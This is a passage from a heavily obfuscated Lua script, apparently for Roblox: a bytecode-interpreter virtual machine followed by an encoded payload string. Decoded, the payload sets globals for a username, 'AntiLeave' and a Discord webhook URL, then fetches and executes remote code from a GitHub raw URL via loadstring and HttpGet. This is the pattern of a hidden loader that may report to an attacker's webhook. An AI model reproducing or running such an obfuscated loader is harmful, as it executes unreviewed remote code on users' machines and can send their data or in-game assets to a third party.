																																			if (v421 == 0) then
																																				v163 = v151[v155];
																																				v161[v163[2]] = v161[v163[3]][v163[8 - 4]];
																																				v421 = 1;
																																			end
																																		end
																																	end
																																	if (3 == v273) then
																																		local v422 = 0;
																																		while true do
																																			if (2 == v422) then
																																				v273 = 4;
																																				break;
																																			end
																																			if (v422 == 1) then
																																				v163 = v151[v155];
																																				v161[v163[2]] = v161[v163[3]][v163[4]];
																																				v422 = 2;
																																			end
																																			if (v422 == 0) then
																																				v161[v163[2]] = v91[v163[3]];
																																				v155 = v155 + 1;
																																				v422 = 1;
																																			end
																																		end
																																	end
																																	if (v273 == 4) then
																																		local v423 = 0;
																																		while true do
																																			if (1 == v423) then
																																				v161[v163[2]] = v91[v163[3]];
																																				v155 = v155 + 1;
																																				v423 = 2;
																																			end
																																			if (v423 == 0) then
																																				v155 = v155 + (1 - 0);
																																				v163 = v151[v155];
																																				v423 = 1;
																																			end
																																			if (v423 == 2) then
																																				v273 = 5;
																																				break;
																																			end
																																		end
																																	end
																																end
																																break;
																															end
																														end
																													end
																												elseif (v164 <= 12) then
																													if (v164 <= 10) then
																														if (v164 == 9) then
																															v161[v163[1 + 1]] = v161[v163[4 - 1]] + v163[4];
																														else
																															v161[v163[2]] = v161[v163[3]] % v163[4];
																														end
																													elseif (v164 > 11) then
																														local v217 = 0;
																														local v218;
																														while true do
																															if (v217 == 0) then
																																v218 = v163[2];
																																v161[v218](v21(v161, v218 + 1, v156));
																																break;
																															end
																														end
																													else
																														v161[v163[2 + 0]] = #v161[v163[3]];
																													end
																												elseif (v164 <= 14) then
																													if (v164 > 13) then
																														local v220 = 0;
																														local v221;
																														local v222;
																														while true do
																															if (0 == v220) then
																																v221 = v163[2];
																																v222 = v161[v163[794 - (368 + 423)]];
																																v220 = 1;
																															end
																															if (v220 == 1) then
																																v161[v221 + 1] = v222;
																																v161[v221] = v222[v163[4]];
																																break;
																															end
																														end
																													else
																														do
																															return;
																														end
																													end
																												elseif (v164 <= 15) then
																													v161[v163[2]]();
																												elseif (v164 > 16) then
																													v161[v163[2]] = v161[v163[3]] % v161[v163[4]];
																												elseif not v161[v163[2]] then
																													v155 = v155 + 1;
																												else
																													v155 = v163[3];
																												end
																											elseif (v164 <= 26) then
																												if (v164 <= 21) then
																													if (v164 <= 19) then
																														if (v164 > 18) then
																															v91[v163[3]] = v161[v163[2]];
																														else
																															local v225 = 0;
																															local v226;
																															while true do
																																if (v225 == 4) then
																																	v155 = v155 + 1;
																																	v163 = v151[v155];
																																	v91[v163[3]] = v161[v163[20 - (10 + 8)]];
																																	v225 = 5;
																																end
																																if (v225 == 0) then
																																	v226 = nil;
																																	v161[v163[2]] = v161[v163[3]];
																																	v155 = v155 + (3 - 2);
																																	v225 = 1;
																																end
																																if (6 == v225) then
																																	v155 = v155 + 1;
																																	v163 = v151[v155];
																																	v91[v163[3]] = v161[v163[2]];
																																	v225 = 7;
																																end
																																if (5 == v225) then
																																	v155 = v155 + 1;
																																	v163 = v151[v155];
																																	v161[v163[2]] = v163[3];
																																	v225 = 6;
																																end
																																if (v225 == 9) then
																																	v155 = v155 + 1;
																																	v163 = v151[v155];
																																	v161[v163[2]] = v163[3];
																																	break;
																																end
																																if (v225 == 2) then
																																	v163 = v151[v155];
																																	v161[v163[2]] = v163[3];
																																	v155 = v155 + 1;
																																	v225 = 3;
																																end
																																if (v225 == 3) then
																																	v163 = v151[v155];
																																	v226 = v163[2];
																																	v161[v226] = v161[v226](v21(v161, v226 + 1, v163[3]));
																																	v225 = 4;
																																end
																																if (v225 == 1) then
																																	v163 = v151[v155];
																																	v161[v163[2]] = v163[3];
																																	v155 = v155 + 1;
																																	v225 = 2;
																																end
																																if (v225 == 7) then
																																	v155 = v155 + 1;
																																	v163 = v151[v155];
																																	v161[v163[2]] = v161[v163[3]];
																																	v225 = 8;
																																end
																																if (v225 == 8) then
																																	v155 = v155 + 1;
																																	v163 = v151[v155];
																																	v161[v163[2]] = v163[3];
																																	v225 = 9;
																																end
																															end
																														end
																													elseif (v164 > 20) then
																														local v227 = 0;
																														local v228;
																														local v229;
																														local v230;
																														local v231;
																														while true do
																															if (v227 == 2) then
																																while true do
																																	if (v228 == 1) then
																																		local v395 = 0;
																																		while true do
																																			if (0 == v395) then
																																				v231 = v161[v229] + v230;
																																				v161[v229] = v231;
																																				v395 = 1;
																																			end
																																			if (v395 == 1) then
																																				v228 = 2;
																																				break;
																																			end
																																		end
																																	end
																																	if (v228 == 2) then
																																		if (v230 > 0) then
																																			if (v231 <= v161[v229 + 1]) then
																																				local v519 = 0;
																																				while true do
																																					if (0 == v519) then
																																						v155 = v163[3];
																																						v161[v229 + 3] = v231;
																																						break;
																																					end
																																				end
																																			end
																																		elseif (v231 >= v161[v229 + 1]) then
																																			local v520 = 0;
																																			while true do
																																				if (v520 == 0) then
																																					v155 = v163[11 - 8];
																																					v161[v229 + 3] = v231;
																																					break;
																																				end
																																			end
																																		end
																																		break;
																																	end
																																	if (v228 == 0) then
																																		local v396 = 0;
																																		while true do
																																			if (v396 == 1) then
																																				v228 = 1;
																																				break;
																																			end
																																			if (v396 == 0) then
																																				v229 = v163[2];
																																				v230 = v161[v229 + 2];
																																				v396 = 1;
																																			end
																																		end
																																	end
																																end
																																break;
																															end
																															if (v227 == 0) then
																																v228 = 0;
																																v229 = nil;
																																v227 = 1;
																															end
																															if (v227 == 1) then
																																v230 = nil;
																																v231 = nil;
																																v227 = 2;
																															end
																														end
																													else
																														local v232 = 0;
																														local v233;
																														local v234;
																														local v235;
																														while true do
																															if (1 == v232) then
																																v155 = v155 + (443 - (416 + 26));
																																v163 = v151[v155];
																																v161[v163[2]] = v163[9 - 6];
																																v155 = v155 + 1;
																																v232 = 2;
																															end
																															if (v232 == 2) then
																																v163 = v151[v155];
																																v161[v163[2]] = #v161[v163[3]];
																																v155 = v155 + 1;
																																v163 = v151[v155];
																																v232 = 3;
																															end
																															if (v232 == 3) then
																																v161[v163[2]] = v163[3];
																																v155 = v155 + 1;
																																v163 = v151[v155];
																																v235 = v163[2];
																																v232 = 4;
																															end
																															if (v232 == 4) then
																																v234 = v161[v235];
																																v233 = v161[v235 + 1 + 1];
																																if (v233 > 0) then
																																	if (v234 > v161[v235 + 1]) then
																																		v155 = v163[4 - 1];
																																	else
																																		v161[v235 + (441 - (145 + 293))] = v234;
																																	end
																																elseif (v234 < v161[v235 + 1]) then
																																	v155 = v163[3];
																																else
																																	v161[v235 + 3] = v234;
																																end
																																break;
																															end
																															if (v232 == 0) then
																																v233 = nil;
																																v234 = nil;
																																v235 = nil;
																																v161[v163[2]] = {};
																																v232 = 1;
																															end
																														end
																													end
																												elseif (v164 <= 23) then
																													if (v164 > 22) then
																														local v236 = 0;
																														local v237;
																														while true do
																															if (v236 == 0) then
																																v237 = v163[432 - (44 + 386)];
																																v161[v237] = v161[v237](v21(v161, v237 + 1, v163[3]));
																																break;
																															end
																														end
																													else
																														local v238 = 0;
																														local v239;
																														local v240;
																														local v241;
																														local v242;
																														while true do
																															if (v238 == 0) then
																																v239 = nil;
																																v240, v241 = nil;
																																v242 = nil;
																																v238 = 1;
																															end
																															if (v238 == 1) then
																																v161[v163[2]] = v163[3] ~= 0;
																																v155 = v155 + 1;
																																v163 = v151[v155];
																																v238 = 2;
																															end
																															if (v238 == 6) then
																																v155 = v155 + 1;
																																v163 = v151[v155];
																																do
																																	return;
																																end
																																break;
																															end
																															if (v238 == 4) then
																																v163 = v151[v155];
																																v242 = v163[2];
																																v161[v242] = v161[v242](v21(v161, v242 + 1, v156));
																																v238 = 5;
																															end
																															if (v238 == 5) then
																																v155 = v155 + 1;
																																v163 = v151[v155];
																																v161[v163[2]]();
																																v238 = 6;
																															end
																															if (v238 == 3) then
																																v239 = 0;
																																for v371 = v242, v156 do
																																	local v372 = 0;
																																	while true do
																																		if (v372 == 0) then
																																			v239 = v239 + 1;
																																			v161[v371] = v240[v239];
																																			break;
																																		end
																																	end
																																end
																																v155 = v155 + (1487 - (998 + 488));
																																v238 = 4;
																															end
																															if (v238 == 2) then
																																v242 = v163[2];
																																v240, v241 = v154(v161[v242](v21(v161, v242 + 1, v163[3])));
																																v156 = (v241 + v242) - 1;
																																v238 = 3;
																															end
																														end
																													end
																												elseif (v164 <= (8 + 16)) then
																													local v243 = 0;
																													local v244;
																													local v245;
																													while true do
																														if (0 == v243) then
																															v244 = 0;
																															v245 = nil;
																															v243 = 1;
																														end
																														if (v243 == 1) then
																															while true do
																																if (v244 == 0) then
																																	v245 = v163[2];
																																	do
																																		return v21(v161, v245, v156);
																																	end
																																	break;
																																end
																															end
																															break;
																														end
																													end
																												elseif (v164 == 25) then
																													v161[v163[2]][v163[3]] = v163[4];
																												else
																													v161[v163[2]] = v161[v163[3]][v163[4]];
																												end
																											elseif (v164 <= 30) then
																												if (v164 <= 28) then
																													if (v164 > 27) then
																														local v246 = 0;
																														local v247;
																														local v248;
																														local v249;
																														local v250;
																														while true do
																															if (2 == v246) then
																																for v373 = v247, v156 do
																																	local v374 = 0;
																																	while true do
																																		if (0 == v374) then
																																			v250 = v250 + 1;
																																			v161[v373] = v248[v250];
																																			break;
																																		end
																																	end
																																end
																																break;
																															end
																															if (v246 == 0) then
																																v247 = v163[2];
																																v248, v249 = v154(v161[v247](v161[v247 + 1]));
																																v246 = 1;
																															end
																															if (v246 == 1) then
																																v156 = (v249 + v247) - 1;
																																v250 = 0;
																																v246 = 2;
																															end
																														end
																													else
																														local v251 = 0;
																														local v252;
																														local v253;
																														while true do
																															if (v251 == 0) then
																																v252 = 0;
																																v253 = nil;
																																v251 = 1;
																															end
																															if (v251 == 1) then
																																while true do
																																	if (0 == v252) then
																																		v253 = v163[2];
																																		v161[v253] = v161[v253](v21(v161, v253 + 1, v156));
																																		break;
																																	end
																																end
																																break;
																															end
																														end
																													end
																												elseif (v164 > 29) then
																													local v254 = 0;
																													local v255;
																													local v256;
																													local v257;
																													local v258;
																													while true do
																														if (v254 == 2) then
																															for v375 = v255, v156 do
																																local v376 = 0;
																																while true do
																																	if (v376 == 0) then
																																		v258 = v258 + (773 - (201 + 571));
																																		v161[v375] = v256[v258];
																																		break;
																																	end
																																end
																															end
																															break;
																														end
																														if (v254 == 0) then
																															v255 = v163[2];
																															v256, v257 = v154(v161[v255](v21(v161, v255 + 1, v156)));
																															v254 = 1;
																														end
																														if (v254 == 1) then
																															v156 = (v257 + v255) - 1;
																															v258 = 0 + 0;
																															v254 = 2;
																														end
																													end
																												else
																													v161[v163[2]] = v163[3];
																												end
																											elseif (v164 <= 32) then
																												if (v164 > 31) then
																													local v261 = 0;
																													local v262;
																													local v263;
																													while true do
																														if (v261 == 4) then
																															v155 = v155 + 1;
																															v163 = v151[v155];
																															v161[v163[2]] = v91[v163[3]];
																															v155 = v155 + 1;
																															v163 = v151[v155];
																															v263 = v163[2];
																															v261 = 5;
																														end
																														if (0 == v261) then
																															v262 = nil;
																															v263 = nil;
																															v91[v163[3]] = v161[v163[2]];
																															v155 = v155 + 1;
																															v163 = v151[v155];
																															v161[v163[1140 - (116 + 1022)]] = v91[v163[3]];
																															v261 = 1;
																														end
																														if (v261 == 1) then
																															v155 = v155 + 1;
																															v163 = v151[v155];
																															v161[v163[2]][v163[3]] = v163[4];
																															v155 = v155 + 1;
																															v163 = v151[v155];
																															v161[v163[2]] = v91[v163[3]];
																															v261 = 2;
																														end
																														if (2 == v261) then
																															v155 = v155 + 1;
																															v163 = v151[v155];
																															v161[v163[2]][v163[12 - 9]] = v163[4];
																															v155 = v155 + 1;
																															v163 = v151[v155];
																															v161[v163[2]] = v91[v163[3]];
																															v261 = 3;
																														end
																														if (v261 == 5) then
																															v262 = v161[v163[3]];
																															v161[v263 + 1] = v262;
																															v161[v263] = v262[v163[4]];
																															break;
																														end
																														if (v261 == 3) then
																															v155 = v155 + 1;
																															v163 = v151[v155];
																															v161[v163[2]][v163[3]] = v163[4];
																															v155 = v155 + 1;
																															v163 = v151[v155];
																															v161[v163[2]] = v91[v163[3]];
																															v261 = 4;
																														end
																													end
																												else
																													v161[v163[2]] = {};
																												end
																											elseif (v164 <= 33) then
																												local v265 = 0;
																												local v266;
																												local v267;
																												local v268;
																												local v269;
																												local v270;
																												while true do
																													if (v265 == 1) then
																														v268 = nil;
																														v269 = nil;
																														v265 = 2;
																													end
																													if (0 == v265) then
																														v266 = 0;
																														v267 = nil;
																														v265 = 1;
																													end
																													if (v265 == 2) then
																														v270 = nil;
																														while true do
																															if (v266 == 2) then
																																for v416 = v267, v156 do
																																	local v417 = 0;
																																	while true do
																																		if (v417 == 0) then
																																			v270 = v270 + 1;
																																			v161[v416] = v268[v270];
																																			break;
																																		end
																																	end
																																end
																																break;
																															end
																															if (v266 == 0) then
																																local v400 = 0;
																																while true do
																																	if (0 == v400) then
																																		v267 = v163[2];
																																		v268, v269 = v154(v161[v267](v21(v161, v267 + 1, v163[3])));
																																		v400 = 1;
																																	end
																																	if (v400 == 1) then
																																		v266 = 1;
																																		break;
																																	end
																																end
																															end
																															if (v266 == 1) then
																																local v401 = 0;
																																while true do
																																	if (v401 == 1) then
																																		v266 = 2;
																																		break;
																																	end
																																	if (0 == v401) then
																																		v156 = (v269 + v267) - 1;
																																		v270 = 0;
																																		v401 = 1;
																																	end
																																end
																															end
																														end
																														break;
																													end
																												end
																											elseif (v164 == 34) then
																												local v279 = 0;
																												local v280;
																												local v281;
																												while true do
																													if (v279 == 0) then
																														v280 = 0;
																														v281 = nil;
																														v279 = 1;
																													end
																													if (v279 == 1) then
																														while true do
																															if (v280 == 0) then
																																v281 = v163[2 + 0];
																																do
																																	return v161[v281](v21(v161, v281 + 1, v163[3]));
																																end
																																break;
																															end
																														end
																														break;
																													end
																												end
																											else
																												v161[v163[2]] = v90[v163[3]];
																											end
																											v155 = v155 + 1;
																											break;
																										end
																										if (v179 == 0) then
																											local v188 = 0;
																											while true do
																												if (1 == v188) then
																													v179 = 1;
																													break;
																												end
																												if (v188 == 0) then
																													v163 = v151[v155];
																													v164 = v163[1];
																													v188 = 1;
																												end
																											end
																										end
																									end
																									break;
																								end
																							end
																						end
																						break;
																					end
																					if (v150 == 4) then
																						v162 = (v159 - v153) + 1;
																						v163 = nil;
																						v164 = nil;
																						v150 = 5;
																					end
																					if (v150 == 3) then
																						v160 = {};
																						v161 = {};
																						for v180 = 0, v159 do
																							if (v180 >= v153) then
																								v157[v180 - v153] = v158[v180 + 1];
																							else
																								v161[v180] = v158[v180 + 1];
																							end
																						end
																						v150 = 4;
																					end
																					if (v150 == 2) then
																						v157 = {};
																						v158 = {...};
																						v159 = v20("#", ...) - 1;
																						v150 = 3;
																					end
																					if (v150 == 1) then
																						v154 = v41;
																						v155 = 1;
																						v156 = -1;
																						v150 = 2;
																					end
																				end
																			end;
																		end
																	end
																end
																break;
															end
														end
													end
													break;
												end
												if (v92 == 0) then
													v93 = 0;
													v94 = nil;
													v92 = 1;
												end
												if (v92 == 1) then
													v95 = nil;
													v96 = nil;
													v92 = 2;
												end
											end
										end
										v51 = 1;
									end
								end
							end
							v45 = 1;
						end
					end
				end
				break;
			end
		end
	end
	v23("LOL!1B3O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403083O00557365724E616D6503093O00C1CCCB28E7B5F8468103083O007EB1A3BB4586DBA703073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O31323534382O31363O373332342O352O302F52792D4C7279596D747A634B562O6D7348755571542O4A594D315F49305A4F4663435764397952346E4155694C326D4D44364A57412O6B71324566795846383447592D4603093O00557365724E616D653203093O0033C23AC8FD2DF2729503053O009C43AD4AA503023O005F47030D3O004C6F6164696E675363722O656E2O0103093O00416E74694C6561766503093O004D6F7573654C6F636B030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403463O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4C7970686572582F4D6F7269536372697074732F6D61696E2F4D6F72695363726970745A00313O0012083O00013O00206O000200122O000100013O00202O00010001000300122O000200013O00202O00020002000400122O000300053O00062O0003000A000100010004063O000A0001001201000300063O00201A000400030007001201000500083O00201A000500050009001201000600083O00201A00060006000A00060300073O000100062O00023O00064O00028O00023O00044O00023O00014O00023O00024O00023O00054O0012000800073O00122O0009000C3O00122O000A000D6O0008000A000200122O0008000B3O00122O0008000F3O00122O0008000E6O000800073O00122O000900113O00122O000A00124O00170008000A0002001220000800103O00122O000800133O00302O00080014001500122O000800133O00302O00080016001500122O000800133O00302O00080017001500122O000800183O00122O000900193O00202O00090009001A00121D000B001B4O0016000C00016O0009000C6O00083O00024O0008000100016O00013O00013O00023O00026O00F03F026O00704002264O001400025O00122O000300016O00045O00122O000500013O00042O0003002100012O002300076O0005000800026O000900016O000A00026O000B00036O000C00046O000D8O000E00063O00202O000F000600014O000C000F6O000B3O00024O000C00036O000D00046O000E00016O000F00016O000F0006000F00102O000F0001000F4O001000016O00100006001000102O00100001001000202O0010001000014O000D00106O000C8O000A3O000200202O000A000A00024O0009000A6O00073O00010004150003000500012O0023000300054O0002000400024O0022000300044O001800036O000D3O00017O00", v17(), ...);
end
